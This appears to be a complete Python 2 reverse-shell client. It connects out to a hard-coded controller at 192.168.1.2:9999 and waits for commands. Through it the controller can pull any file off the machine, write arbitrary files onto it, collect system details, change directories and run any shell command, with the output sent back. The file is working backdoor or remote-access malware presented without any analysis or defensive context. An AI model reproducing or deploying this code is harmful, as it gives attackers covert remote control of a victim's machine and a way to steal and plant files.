from socket import *
import subprocess
import os
import platform

s=socket(AF_INET ,SOCK_STREAM)
s.connect(("192.168.1.2" , 9999))

while True:

	shell = s.recv(1024)

	if shell == '1': #download
		name = s.recv(1024)
		file = open(name , "rb") # read binary
		data = buffer(file.read())
		s.sendall(str(len(data)))
		print s.recv(1024)
		s.sendall(data)
		file.close()

	elif shell == '2': # upload

		name = s.recv(1024)
		file = open(name , "wb") 
		data = s.recv(1024) #len
		s.sendall("Recved Len data ")
		my_write = str(s.recv(int(data)))
		file.write(my_write)
		file.close()

	elif shell == '3':

			data = 'os = '+platform.uname()[0]+''+platform.uname()[2]+' '+platform.architecture()[0]+'\n'
			data += 'node = '+platform.node()+'\n'
			data += 'User = '+platform.uname()[1]+'\n'
			data += 'system Type = '+platform.uname()[5]+'\n'
			s.sendall(str(data))

	elif shell[0:2] == "cd":

			try:
				os.chdir(shell[3:])
				s.sendall("new Path =>"+str(os.getcwd()))
			except:
				s.sendall("Not Directory !")
	else: # cmd

			cmd = subprocess.check_output(shell , shell=True)
			s.sendall(cmd)

s.close()

			





